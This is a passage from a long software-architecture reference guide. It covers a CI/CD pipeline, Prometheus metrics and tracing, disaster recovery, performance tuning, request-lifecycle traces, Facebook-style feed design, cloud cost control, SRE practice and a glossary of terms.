      - run: npm test -- --coverage  # Run tests + generate coverage report
      
      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v3
        # Fails if coverage drops below threshold configured in codecov.yml
  
  integration-tests:
    runs-on: ubuntu-latest
    services:
      # Spin up real PostgreSQL for integration tests
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_PASSWORD: test_password
          POSTGRES_DB: test_db
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      
      redis:
        image: redis:7-alpine
        options: --health-cmd "redis-cli ping"
    
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      - run: npm ci
      - run: npx prisma migrate deploy
        env:
          DATABASE_URL: postgresql://postgres:test_password@localhost:5432/test_db
      - run: npm run test:e2e
  
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      # Scan for known vulnerabilities in dependencies
      - name: Run npm audit
        run: npm audit --audit-level=high
      
      # Scan for secrets accidentally committed to code
      - name: Scan for secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD
      
      # SAST: Static Application Security Testing
      # Analyzes code patterns for security vulnerabilities
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: "p/owasp-top-ten p/nodejs"
  
  # ─────────────────────────────────────────────────────
  # PHASE 2: BUILD AND PUSH DOCKER IMAGES
  # (Only runs if ALL quality gates pass)
  # ─────────────────────────────────────────────────────
  
  build-and-push:
    needs: [lint-and-typecheck, unit-tests, integration-tests, security-scan]
    runs-on: ubuntu-latest
    
    outputs:
      image-tag: ${{ steps.meta.outputs.tags }}
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
      
      - name: Login to Google Container Registry
        uses: docker/login-action@v3
        with:
          registry: gcr.io
          username: _json_key
          password: ${{ secrets.GCR_SERVICE_ACCOUNT_KEY }}
      
      - name: Extract metadata for Docker
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: gcr.io/yourcompany/user-service
          tags: |
            type=sha,prefix=sha-
            type=ref,event=branch
      
      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          context: ./service-user
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha      # GitHub Actions cache for Docker layers
          cache-to: type=gha,mode=max
  
  # ─────────────────────────────────────────────────────
  # PHASE 3: DEPLOY TO STAGING
  # ─────────────────────────────────────────────────────
  
  deploy-staging:
    needs: build-and-push
    runs-on: ubuntu-latest
    environment: staging
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Configure kubectl
        uses: azure/setup-kubectl@v3
      
      - name: Set Kubernetes context
        uses: azure/k8s-set-context@v3
        with:
          method: kubeconfig
          kubeconfig: ${{ secrets.STAGING_KUBECONFIG }}
      
      - name: Deploy to staging
        run: |
          kubectl set image deployment/user-service \
            user-service=gcr.io/yourcompany/user-service:${{ needs.build-and-push.outputs.image-tag }} \
            -n staging
          
          kubectl rollout status deployment/user-service -n staging --timeout=300s
      
      - name: Run smoke tests against staging
        run: |
          npm run test:smoke -- --base-url=https://staging.yourapp.com
  
  # ─────────────────────────────────────────────────────
  # PHASE 4: DEPLOY TO PRODUCTION (Requires manual approval)
  # ─────────────────────────────────────────────────────
  
  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      # This pauses here and requires a human to click "Approve" in GitHub UI
      url: https://yourapp.com
    
    steps:
      - name: Apply database migrations
        run: |
          kubectl exec -n production deployment/user-service -- \
            npx prisma migrate deploy
      
      - name: Rolling deployment to production
        run: |
          kubectl set image deployment/user-service \
            user-service=gcr.io/yourcompany/user-service:${{ needs.build-and-push.outputs.image-tag }} \
            -n production
          
          kubectl rollout status deployment/user-service -n production --timeout=600s
      
      - name: Notify team on Slack
        uses: slackapi/slack-github-action@v1
        with:
          payload: |
            {
              "text": "✅ user-service v${{ github.sha }} deployed to production by ${{ github.actor }}"
            }
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
```

---

## 21. Layer 18: Observability (Metrics, Logging, Tracing)

### 21.1 The Three Pillars of Observability

Without observability, when something goes wrong in production, you are blind. With it, you can answer the question: "Why is the app slow/broken?"

```
THE THREE PILLARS:

1. METRICS (Prometheus + Grafana)
   "The 500 error rate jumped from 0.1% to 15% at 3:47pm"
   Numerical measurements over time. Helps you know THAT something is wrong.

2. LOGS (ELK Stack / Loki)
   "Request ID req_abc123 failed with: Cannot connect to database - Connection refused"
   Text records of events. Helps you know WHAT the error message is.

3. DISTRIBUTED TRACES (Jaeger / Zipkin)
   "This user request took 8 seconds. Database query on shard-3 took 7.8s of that"
   End-to-end journey of one request through all services. Helps you know WHERE the slowness is.
```

### 21.2 Metrics in Depth (Prometheus)

Prometheus is a "pull-based" metrics system. It regularly calls a `/metrics` endpoint on each service and stores the data:

```typescript
// service-notification/index.js - Metrics setup (already in your repo)

const promClient = require('prom-client');

// Register default metrics: CPU usage, memory, event loop lag, active handles
promClient.collectDefaultMetrics({ register: promClient.register });

// Custom application metrics:

// Counter: A value that only ever goes up (total requests, total errors)
const httpRequestsTotal = new promClient.Counter({
  name: 'http_requests_total',
  help: 'Total number of HTTP requests',
  labelNames: ['method', 'path', 'status_code']
});

// Histogram: Distribution of values (response time buckets)
const httpRequestDuration = new promClient.Histogram({
  name: 'http_request_duration_seconds',
  help: 'HTTP request duration in seconds',
  labelNames: ['method', 'path'],
  buckets: [0.005, 0.01, 0.05, 0.1, 0.5, 1, 2, 5]  // Response time buckets
});

// Gauge: A value that can go up and down (current active connections)
const activeConnections = new promClient.Gauge({
  name: 'socket_active_connections',
  help: 'Number of currently active socket connections'
});

// Use the metrics:
app.use((req, res, next) => {
  const timer = httpRequestDuration.startTimer({ method: req.method, path: req.path });
  
  res.on('finish', () => {
    httpRequestsTotal.inc({
      method: req.method,
      path: req.path,
      status_code: res.statusCode
    });
    timer();  // Records the duration
  });
  
  next();
});

io.on('connection', (socket) => {
  activeConnections.inc();
  socket.on('disconnect', () => activeConnections.dec());
});

// Expose /metrics endpoint for Prometheus to scrape
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', promClient.register.contentType);
  res.end(await promClient.register.metrics());
});
```

**Prometheus configuration:**
```yaml
# config-prometheus/prometheus.yml (already in your repo)

global:
  scrape_interval: 15s      # Collect metrics every 15 seconds
  evaluation_interval: 15s  # Evaluate alerting rules every 15 seconds

alerting:
  alertmanagers:
    - static_configs:
        - targets: ['alertmanager:9093']

rule_files:
  - "alerts.yml"  # Alerting rules

scrape_configs:
  - job_name: 'notification-service'
    static_configs:
      - targets: ['notification-service:4000']
    metrics_path: '/metrics'
  
  - job_name: 'user-service'
    static_configs:
      - targets: ['user-service:3000']
  
  - job_name: 'kubernetes-pods'
    kubernetes_sd_configs:
      - role: pod
    # Automatically discovers all Kubernetes pods with the 'prometheus.io/scrape: true' annotation
```

**Alerting rules:**
```yaml
# alerts.yml

groups:
  - name: critical-alerts
    rules:
      # Alert if error rate exceeds 1% for more than 5 minutes
      - alert: HighErrorRate
        expr: |
          rate(http_requests_total{status_code=~"5.."}[5m])
          /
          rate(http_requests_total[5m])
          > 0.01
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "High error rate on {{ $labels.job }}"
          description: "Error rate is {{ $value | humanizePercentage }} for the last 5 minutes"
      
      # Alert if p99 latency exceeds 2 seconds
      - alert: HighLatency
        expr: |
          histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m])) > 2
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "High p99 latency: {{ $value }}s"
      
      # Alert if Kafka consumer lag exceeds 10,000 messages
      - alert: KafkaConsumerLag
        expr: kafka_consumer_group_lag > 10000
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: "Kafka consumer group {{ $labels.group }} is falling behind"
```

### 21.3 Distributed Tracing

When a user request touches 15 microservices, you need to trace its entire journey:

```
USER REQUEST: GET /api/feed
Total time: 3.2 seconds (user complains it's slow)

TRACE VISUALIZATION (Jaeger/Zipkin UI):

▼ api-gateway (3ms)
  ▼ feed-service.getFeed() (3190ms) ← SLOW!
    ▼ user-service.getUser() (5ms)
    ▼ redis.get("feed:usr_123") (1ms) → MISS
    ▼ postgres.query("SELECT posts...") (3180ms) ← THE BOTTLENECK! Missing index!
    ▼ redis.set("feed:usr_123") (2ms)

ANSWER: PostgreSQL query is missing an index on (user_id, created_at)
After adding: CREATE INDEX feed_user_time ON posts(user_id, created_at DESC);
New performance: 3190ms → 45ms ✅
```

**Implementing OpenTelemetry (the standard for distributed tracing):**

```typescript
// tracing.ts — Set up ONCE and it instruments all HTTP calls automatically

import { NodeSDK } from '@opentelemetry/sdk-node';
import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';
import { HttpInstrumentation } from '@opentelemetry/instrumentation-http';
import { NestInstrumentation } from '@opentelemetry/instrumentation-nestjs-core';
import { PrismaInstrumentation } from '@prisma/instrumentation';

const sdk = new NodeSDK({
  serviceName: 'user-service',
  traceExporter: new OTLPTraceExporter({
    url: 'http://jaeger:4318/v1/traces',  // Jaeger collector
  }),
  instrumentations: [
    new HttpInstrumentation(),    // Auto-traces all HTTP calls in and out
    new NestInstrumentation(),    // Auto-traces NestJS controllers
    new PrismaInstrumentation(),  // Auto-traces all database queries
  ],
});

sdk.start();
// That's it! All HTTP requests, NestJS routes, and Prisma queries are now traced.
// The trace context is automatically propagated in HTTP headers to downstream services.
```

---

## 22. Layer 19: Disaster Recovery and Resilience

### 22.1 The Five Nines — What "High Availability" Really Means

```
AVAILABILITY TIERS:

99%       = 3.65 days downtime per year    (Unacceptable for any production service)
99.9%     = 8.77 hours downtime per year   (Basic SLA for non-critical services)
99.95%    = 4.38 hours downtime per year   (Standard for most enterprise apps)
99.99%    = 52.6 minutes downtime per year (High availability — what we aim for)
99.999%   = 5.26 minutes downtime per year (Five nines — Google, AWS level)

How Facebook achieves 99.99%:
  - Multiple data centers across multiple continents
  - Each data center is independent — US can serve all traffic if EU goes down
  - No single point of failure at ANY layer
```

### 22.2 The Chaos Engineering Philosophy

Netflix pioneered "Chaos Engineering" — deliberately breaking things in production to ensure the system is resilient:

```
NETFLIX CHAOS MONKEY:
  A script that randomly terminates EC2 instances in production during business hours.
  
  Philosophy: "If we don't test our failure modes, we'll discover them at the worst time.
               It's better to have a small, controlled failure during business hours
               when the team is awake than a catastrophic failure at 3am."

FAILURE SCENARIOS TO TEST:
  ✓ Kill a random pod → Kubernetes should restart it in < 30 seconds
  ✓ Kill an entire node → Pods should reschedule to healthy nodes in < 2 minutes
  ✓ Block all traffic to the database → App should return cached data or graceful error
  ✓ Make Kafka slow to respond → App should continue (with degraded functionality)
  ✓ Saturate network bandwidth → Requests should queue, not crash
  ✓ Fill disk on one node → Kubernetes should stop scheduling pods on that node

Netflix's Simian Army includes:
  Chaos Monkey: Kills random instances
  Chaos Gorilla: Takes down entire AWS availability zones
  Chaos Kong: Simulates failure of entire AWS regions
  Latency Monkey: Introduces artificial network latency between services
```

### 22.3 Backup and Recovery Strategy

```
BACKUP TIERS:

1. Database Continuous Backups (Point-in-Time Recovery):
   - AWS RDS takes automated backups every 5 minutes
   - Can restore to ANY point in time within 35 days
   - Example: "Restore the database to exactly 3:42:17pm on October 25th"
   - Protects against: accidental deletion, data corruption, software bugs

2. Daily Snapshots:
   - Full database snapshot every night at 3am
   - Retained for 90 days
   - Stored in a DIFFERENT AWS region (e.g., us-east-1 database, backups in eu-west-1)
   - Protects against: Region-level disaster

3. Application State Backups:
   - Kafka: Messages are retained for 7 days (can replay)
   - Redis: RDB snapshots every hour + AOF persistence (every write logged to disk)
   - S3: Cross-region replication (every file copied to backup bucket in another region)
   - Elasticsearch: Snapshots to S3 daily

4. Disaster Recovery Plan:
   - RTO (Recovery Time Objective): "How long can we be down?" → 1 hour
   - RPO (Recovery Point Objective): "How much data can we lose?" → 5 minutes
   
   DR procedure:
   a. Terraform creates infrastructure in backup region from code (30 minutes)
   b. RDS snapshot restored in backup region (20 minutes)
   c. DNS updated to point to backup region (5 minutes)
   d. Total time: ~55 minutes → Meets 1-hour RTO
```

---

## 23. Layer 20: Performance Optimization

### 23.1 The Performance Optimization Hierarchy

```
ALWAYS OPTIMIZE IN THIS ORDER:

1. Algorithm/Data Structure (10x-1000x improvement possible)
   A poorly chosen algorithm will never be fast, no matter how much hardware you add
   O(n²) → O(n log n) sort improvement is worth 1000 hardware upgrades

2. Database Query Optimization (10x-100x improvement possible)
   Missing indexes are the #1 cause of slow APIs
   EXPLAIN ANALYZE every slow query

3. Caching (10x-100x improvement possible)
   Avoid computing the same thing twice

4. Concurrency/Parallelism (2x-10x improvement possible)
   If you have 4 CPU cores and use 1, you're leaving performance on the table

5. Network Optimization (2x-5x improvement possible)
   HTTP/2 multiplexing, gzip compression, connection pooling

6. Infrastructure Scaling (2x-10x improvement possible)
   Add more hardware — but this is the most expensive and least efficient option
   Add hardware ONLY after optimizing software
```

### 23.2 Database Query Optimization

```sql
-- SCENARIO: Profile page takes 5 seconds to load

-- STEP 1: Identify the slow query
-- Enable slow query log in PostgreSQL:
-- log_min_duration_statement = 1000  (log queries > 1 second)

-- STEP 2: EXPLAIN ANALYZE the query
EXPLAIN ANALYZE
  SELECT u.*, p.*, 
    (SELECT COUNT(*) FROM posts WHERE user_id = u.id) as post_count,
    (SELECT COUNT(*) FROM friendships WHERE user_id = u.id) as friend_count
  FROM users u
  LEFT JOIN profiles p ON p.user_id = u.id
  WHERE u.id = 'usr_123456';

-- Output shows:
-- Seq Scan on posts (cost=0.00..45678.00 rows=100000 width=8) (actual time=4800.123 ms)
-- ← SEQUENTIAL SCAN! Reading 100,000 rows to count posts for one user!

-- STEP 3: Add the missing index
CREATE INDEX CONCURRENTLY idx_posts_user_id ON posts(user_id);
-- CONCURRENTLY means the index builds without locking the table (safe in production)

-- After index: Same query runs in 12ms instead of 5 seconds. 400x improvement.

-- STEP 4: Fix the N+1 query problem
-- BAD: For each user in a list, run a separate query
const users = await prisma.user.findMany({ take: 20 });
for (const user of users) {
  user.posts = await prisma.post.findMany({ where: { userId: user.id } }); // 20 queries!
}

-- GOOD: Single query with include
const users = await prisma.user.findMany({
  take: 20,
  include: {
    posts: true  // JOIN — single query fetches everything
  }
});
```

### 23.3 Connection Pooling

```
PROBLEM:
  Opening a database connection takes 50-100ms (TCP handshake + auth)
  If your app opens a new connection for every request:
  10,000 requests/second = 10,000 new connections/second = database overwhelmed

SOLUTION: Connection Pool (PgBouncer for PostgreSQL)

  ┌──────────────────────────────────────────────────────┐
  │              APPLICATION (100 pods)                  │
  │  Each pod has 10 connections in its pool = 1000 total│
  └──────────────────────────────────────────────────────┘
                           │
              ┌────────────▼──────────────┐
              │  PgBouncer (Connection Pool│
              │  Proxy)                   │
              │  1000 app connections → 50│
              │  actual DB connections    │
              └────────────┬──────────────┘
                           │
              ┌────────────▼──────────────┐
              │  PostgreSQL               │
              │  Max 100 connections      │
              └───────────────────────────┘

PgBouncer queues incoming connection requests and reuses existing ones.
1000 pods all sharing 50 database connections efficiently.
```

### 23.4 API Response Optimization

```typescript
// OPTIMIZATION 1: Compression
import compression from 'compression';
app.use(compression());  // Compresses JSON responses with gzip (70% size reduction)

// OPTIMIZATION 2: Pagination — NEVER return all records
// ❌ BAD:
app.get('/api/posts', async (req, res) => {
  const posts = await db.query('SELECT * FROM posts');  // Could be millions of rows!
  res.json(posts);
});

// ✅ GOOD:
app.get('/api/posts', async (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 20, 100);
  const cursor = req.query.cursor;  // Cursor-based pagination (more efficient than OFFSET)
  
  const posts = await prisma.post.findMany({
    take: limit + 1,
    cursor: cursor ? { id: cursor } : undefined,
    orderBy: { createdAt: 'desc' }
  });
  
  const hasNextPage = posts.length > limit;
  const nextCursor = hasNextPage ? posts[limit - 1].id : null;
  
  res.json({ posts: posts.slice(0, limit), nextCursor, hasNextPage });
});

// OPTIMIZATION 3: Field selection — return only what's needed
// ❌ BAD: SELECT * returns all columns including large text fields
const user = await prisma.user.findUnique({ where: { id } });

// ✅ GOOD: Only select needed fields
const user = await prisma.user.findUnique({
  where: { id },
  select: { id: true, name: true, email: true }
  // Does NOT fetch: passwordHash, rawData, preferences, etc.
});

// OPTIMIZATION 4: Parallel async operations
// ❌ BAD: Sequential (takes 300ms if each call takes 100ms)
const user = await getUserById(userId);
const posts = await getPostsByUser(userId);
const friends = await getFriendsByUser(userId);

// ✅ GOOD: Parallel (takes 100ms — all 3 run simultaneously)
const [user, posts, friends] = await Promise.all([
  getUserById(userId),
  getPostsByUser(userId),
  getFriendsByUser(userId)
]);
```

---

## 24. Complete Request Lifecycle (End-to-End Flow)

### 24.1 Scenario: User Searches for "React Jobs in London"

Let's trace this single user action through the entire system:

```
MILLISECOND-BY-MILLISECOND TRACE:

0ms: User types "React" in the search box

200ms: Debounce fires (we don't search on every keystroke)
  Frontend code:
  useEffect(() => {
    const timer = setTimeout(() => fetchJobs(searchQuery), 200);
    return () => clearTimeout(timer);
  }, [searchQuery]);

201ms: Next.js component makes API call
  fetch('/api/jobs?q=React&location=London&limit=20')
  
  Note: This is a CLIENT-SIDE fetch (the component has 'use client')
  The request goes to the browser's routing → to the Next.js server

202ms: Request hits Nginx (port 80)
  Nginx: "Path is /api/jobs — but wait, this doesn't have a trailing slash.
          It falls through to location / → forward to frontend-next:3000"
  
  (Path rewriting: /api/jobs → frontend-next:3000/api/jobs)

203ms: Next.js API route handler executes (app/api/jobs/route.ts)
  - Parse query parameters: q="React", location="London", limit=20
  - Connect to Elasticsearch client

204ms: Elasticsearch query executes
  {
    "query": {
      "bool": {
        "must": [{ "multi_match": { "query": "React", "fields": ["title^3", "raw_description"], "fuzziness": "AUTO" } }],
        "filter": [{ "term": { "location": "London" } }]
      }
    },
    "size": 20,
    "sort": [{ "_score": "desc" }, { "scraped_at": "desc" }]
  }

205-250ms: Elasticsearch searches its inverted index
  - Identifies 3,847 documents containing "React" in title or description
  - Filters to 892 matching location "London"
  - Scores each by relevance (BM25 algorithm)
  - Returns top 20

251ms: Next.js API route receives response
  - Maps ES hits to clean JSON: hits.map(h => h._source)
  - Sets Cache-Control header: public, s-maxage=60
  - Returns: { jobs: [...], total: 892, page: 1 }

252ms: Nginx receives response, forwards to browser

253ms: Browser receives JSON

254-260ms: React re-renders the job listings
  - useState setter called with new jobs array
  - React diffing algorithm identifies which DOM elements to update
  - Only changed elements are updated in the DOM (not full re-render)

260ms: User sees 20 job listings ✅
Total time: 260ms (fast enough for a seamless experience)
```

### 24.2 Scenario: User Uploads Resume — Complete gRPC Flow

```
0ms: User selects resume PDF file in browser

1ms: ResumeUpload.tsx handles the file upload
  const formData = new FormData();
  formData.append('resume', file);
  
  const response = await fetch('/api/users/upload-resume', {
    method: 'POST',
    body: formData,
    headers: {
      'Authorization': `Bearer ${accessToken}`
    }
  });

2ms: Request hits Nginx
  Path: /api/users/upload-resume
  location /api/users/ {
    proxy_pass http://user_service/users/;
  }
  Rewrites to: http://user-service:3000/users/upload-resume

3ms: NestJS Gateway
  FirebaseAuthGuard runs:
  - Extracts Bearer token
  - Calls Firebase Admin SDK: admin.auth().verifyIdToken(token)
  - Firebase SDK validates signature using Google's public keys
  - Returns: { uid: "firebase_uid_123", email: "user@example.com" }
  - Attaches to request.user

4ms: UserController.uploadResume() begins execution
  - FileInterceptor saves file to /uploads/1729872000-randomnumber.pdf
  - Validates MIME type is application/pdf

5ms: UserService.processUserResume() called
  - Constructs gRPC request:
    { userId: "firebase_uid_123", filePath: "/uploads/1729872000.pdf" }

6ms: gRPC call to resume-grpc service
  - Binary serialization (protobuf, much faster than JSON)
  - TCP connection (already pooled, no handshake needed)
  - Request sent to resume-grpc:50051

7ms: resume-grpc container receives request
  - grpc_server.py calls main.py's parsing logic

8-200ms: Python PDF parsing and NLP
  - PyPDF2 extracts text from PDF
  - spaCy NLP model tokenizes text
  - PhraseMatcher finds skill keywords
  - Returns: { success: true, skills: ["React", "Node.js", "Docker", "Python"] }

201ms: gRPC response received by user-service
  - Deserialized from protobuf binary

202ms: UserService updates profile in PostgreSQL
  await prisma.profile.upsert({
    where: { userId: "firebase_uid_123" },
    update: { extractedSkills: ["React", "Node.js", "Docker", "Python"] },
    create: { userId: "firebase_uid_123", extractedSkills: ["React", "Node.js", "Docker", "Python"] }
  });

203ms: UserController returns response
  { message: "Resume uploaded and parsed successfully", user: { ...} }

204ms: Browser receives response
  UI shows: "✅ Skills extracted: React, Node.js, Docker, Python"
```

---

## 25. Database Design Patterns at Scale

### 25.1 Normalization vs Denormalization

```
NORMALIZATION (Traditional relational design):
  - Store each piece of data once, reference it elsewhere
  - Eliminates data redundancy
  - Ensures consistency (update in one place)
  
  Schema:
  users:     { id, name, email }
  posts:     { id, user_id, content, created_at }
  comments:  { id, post_id, user_id, content }
  likes:     { id, post_id, user_id }
  
  To get a post with author name + comment count + like count:
  SELECT p.*, u.name as author_name,
    COUNT(DISTINCT c.id) as comment_count,
    COUNT(DISTINCT l.id) as like_count
  FROM posts p
  JOIN users u ON u.id = p.user_id
  LEFT JOIN comments c ON c.post_id = p.id
  LEFT JOIN likes l ON l.post_id = p.id
  WHERE p.id = 'post_123'
  GROUP BY p.id, u.name;
  
  → Complex JOIN query. At scale (millions of posts, billions of likes), very slow.

DENORMALIZATION (Facebook's approach at scale):
  Store pre-computed data to avoid expensive JOINs
  
  posts: {
    id,
    user_id,
    content,
    author_name,        ← Copied from users table (denormalized)
    author_profile_pic, ← Copied from users table
    comment_count,      ← Pre-computed counter (not a JOIN)
    like_count,         ← Pre-computed counter (not a JOIN)
    created_at
  }
  
  → No JOIN needed. Single table read. 10-100x faster.
  
  Trade-off: If user changes their name, you must update EVERY post they made.
  Solution: Background job updates denormalized data asynchronously.
  
  Rule: Denormalize for READ performance, accept the WRITE complexity.
```

### 25.2 The Fan-Out Problem (Facebook's Hardest Problem)

```
SCENARIO: Celebrity with 50 million followers posts a status update.

NAIVE APPROACH: Fan-out on write (push model)
  When celebrity posts:
  1. Write the post to database
  2. For each of 50 million followers:
     INSERT INTO feeds (user_id, post_id) VALUES (follower_id, post_id)
  = 50 million database writes for ONE post
  At 100 writes/second: Takes 5.7 DAYS to update all feeds!
  
  This is called the "celebrity problem" or "hot key problem"

FACEBOOK'S ACTUAL SOLUTION: Hybrid approach
  
  For "normal" users (< 5,000 followers):
    Fan-out on write: Pre-compute feeds in Redis
    When post created → push to all followers' feed caches immediately
    
  For "celebrities" (> 5,000 followers):
    Fan-out on read: Don't pre-compute, compute at read time
    When feed requested:
    1. Get user's pre-computed feed (normal users they follow)
    2. Also query posts from celebrities they follow directly
    3. Merge and sort by time
    
  This means:
  - Normal users' posts: Already in feed cache when you open the app
  - Celebrities' posts: Fetched fresh when you open the app
  - Imperceptible to users (both happen in milliseconds)
```

---

## 26. The Facebook-Scale News Feed Architecture

### 26.1 Facebook's Actual Architecture (Simplified)

Based on Facebook's engineering blog posts, their feed architecture involves:

```
WRITE PATH (when user creates a post):

User creates post
      │
      ▼
Post Service → writes to MySQL (Tao — Facebook's graph database layer)
      │
      ▼
Async Fan-out service reads from Kafka:
      ├── For each user's follower: push post_id to their feed cache (Redis)
      ├── Update search index (Unicorn — Facebook's internal search engine)
      ├── Trigger notification service (push notifications)
      └── Update activity feeds

READ PATH (when user loads their feed):

User opens Facebook
      │
      ▼
Feed Aggregator Service:
  1. Read feed_cache[user_id] from Redis → list of post_ids
  2. Fetch post details for each post_id from Tao (cached)
  3. Fetch author details for each post from Tao (cached)
  4. Apply personalization ranking algorithm (ML model considers: 
       - Recency of post
       - Affinity with author (how often do you interact?)
       - Content type preference (you prefer videos)
       - Post engagement rate (high like/comment ratio = higher score)
  5. Return ranked, personalized feed
      │
      ▼
Client receives personalized ranked feed in ~100ms for 3 billion users
```

### 26.2 The TAO (The Associations and Objects) System

Facebook built their own graph database layer because relational databases couldn't handle their social graph:

```
Facebook's data model is a GRAPH:
  Nodes (Objects): User, Post, Comment, Page, Group, Photo
  Edges (Associations): friendship, like, comment, follow, tagged_in

TAO stores this as:
  Objects: { id: 123, type: "user", data: { name: "John" } }
  Associations: { id1: 123, type: "friendship", id2: 456, time: timestamp }
  
Queries become graph traversals:
  "Get all posts liked by friends of user 123 in last 24 hours"
  → Walk edges from user 123 → friendship edges → friend IDs → like edges → post IDs → filter by time
  
TAO is distributed across:
  - Leaders (handle writes + reads)
  - Followers in same data center (handle reads)
  - Followers in other data centers (handle reads, eventually consistent)
```

---

## 27. Cost Management at Scale

### 27.1 The Reality of Cloud Bills

At scale, cloud infrastructure costs are significant. Here is how enterprises manage them:

```
COST OPTIMIZATION STRATEGIES:

1. Right-Sizing:
   - Continuously monitor actual CPU/memory usage
   - If service uses 10% of its allocated resources consistently → downsize
   - Tools: AWS Cost Explorer, Kubernetes VPA (Vertical Pod Autoscaler)

2. Spot Instances / Preemptible VMs:
   - Cloud providers sell unused capacity at 70-90% discount
   - Downside: Can be terminated with 2 minutes notice
   - Perfect for: Batch jobs, video encoding, ML training
   - NOT suitable for: Stateful services, user-facing APIs

3. Reserved Instances:
   - Commit to using a specific instance type for 1-3 years
   - Discount: 30-60% compared to on-demand pricing
   - Use for: Stable, predictable workloads (databases, always-on services)

4. Auto-scaling to zero during off-hours:
   - Dev/staging environments don't need to run at 3am
   - Scale down to 0 pods at night, back up in the morning
   - Saves ~40% on dev environment costs

5. Data Transfer Costs:
   - Cloud providers charge for data LEAVING their network
   - Compress all data before transmission
   - Use CDN (CDN transfer is cheaper than origin transfer)
   - Keep microservices in the same region (intra-region is free/cheap)

6. Database Costs:
   - Use read replicas for read-heavy workloads (cheaper than larger primary)
   - Archive old data to S3 (1000x cheaper than database storage)
   - Elasticsearch is expensive — use retention policies to delete old indices
```

---

## 28. Team Structure and Ownership

### 28.1 Conway's Law

```
"Organizations which design systems are constrained to produce designs which are 
copies of the communication structures of these organizations."
  — Melvin Conway, 1968

In practice: The architecture of your software mirrors your team structure.

ANTI-PATTERN: One "Backend Team" and one "Frontend Team"
  → Creates a monolith backend (everyone modifies the same code)
  → Constant coordination needed for any feature

MODERN PATTERN: Cross-functional product teams own vertical slices
  
  Team: "Payments Squad" (5-8 engineers)
  └── 1 Product Manager
  └── 1 Designer
  └── 2 Backend Engineers (own payment-service)
  └── 1 Frontend Engineer (own payments UI)
  └── 1 DevOps/SRE (own payments infrastructure)
  
  This team owns the ENTIRE payments experience end-to-end.
  They can ship a payments feature without coordinating with any other team.
  This is Amazon's famous "Two-Pizza Rule": A team should be small enough
  to be fed by two pizzas.
```

### 28.2 SRE (Site Reliability Engineering)

```
SRE is Google's approach to managing large-scale systems.

KEY CONCEPTS:

SLI (Service Level Indicator): A measurement of service behavior
  Example: "Fraction of requests served in under 200ms"

SLO (Service Level Objective): A target for the SLI
  Example: "99.9% of requests must be served in under 200ms"

SLA (Service Level Agreement): The contract with customers, with penalties
  Example: "If uptime drops below 99.9%, customers get bill credit"

Error Budget:
  SLO = 99.9% uptime = allows 0.1% downtime = 8.77 hours per year
  This is your "error budget" — how much downtime you can "spend"
  
  If error budget is healthy: SRE team approves risky releases
  If error budget is depleted: No new releases until reliability improves
  
  This aligns the incentive of the development team (ship features)
  with the reliability team (keep the system stable).
```

---

## 29. Glossary of Terms

| Term | Definition |
|---|---|
| **ACID** | Atomicity, Consistency, Isolation, Durability — database transaction guarantees |
| **API Gateway** | Single entry point that routes requests to appropriate microservices |
| **Blue/Green Deployment** | Run two identical production environments, switch traffic between them |
| **CAP Theorem** | Distributed system can only guarantee 2 of 3: Consistency, Availability, Partition Tolerance |
| **CDN** | Content Delivery Network — global file distribution |
| **Circuit Breaker** | Stops calling failing services to prevent cascade failures |
| **Container** | Lightweight isolated process sharing the host OS kernel |
| **DDD** | Domain-Driven Design — structuring code around business domains |
| **gRPC** | Google's high-performance binary RPC protocol |
| **HPA** | Horizontal Pod Autoscaler — Kubernetes auto-scaling |
| **Idempotency** | Same operation can be applied multiple times without changing result beyond first application |
| **JWT** | JSON Web Token — a signed, self-contained authentication token |
| **Kafka** | Distributed event streaming platform |
| **mTLS** | Mutual TLS — both client and server authenticate each other |
| **Namespace** | Kubernetes isolation boundary for resources |
| **OWASP** | Open Web Application Security Project — web security standards body |
| **PII** | Personally Identifiable Information — data requiring special protection |
| **Pod** | Smallest deployable unit in Kubernetes (one or more containers) |
| **Protobuf** | Protocol Buffers — Google's binary serialization format (faster than JSON) |
| **ReDoS** | Regular Expression Denial of Service — attack using crafted regex input |
| **RPO** | Recovery Point Objective — max data loss acceptable in disaster |
| **RTO** | Recovery Time Objective — max downtime acceptable in disaster |
| **SLA/SLO/SLI** | Service Level Agreement/Objective/Indicator |
| **Sharding** | Horizontal database partitioning across multiple instances |
| **Sidecar** | Helper container running alongside main container (used in service mesh) |
| **SRE** | Site Reliability Engineering — Google's DevOps discipline |
| **SSG** | Static Site Generation — pre-built HTML at build time |
| **SSR** | Server-Side Rendering — HTML generated per-request on server |
| **Terraform** | Infrastructure as Code tool for managing cloud resources |
| **VPC** | Virtual Private Cloud — isolated private network in the cloud |
| **WAF** | Web Application Firewall — filters malicious HTTP traffic |
| **XSS** | Cross-Site Scripting — injecting malicious scripts into web pages |

---

*This document is a living reference. The technologies referenced are those in production at major technology companies as of 2024. The field evolves rapidly — specific tools change, but the fundamental principles (separation of concerns, failure isolation, observability, security in depth) remain constant.*

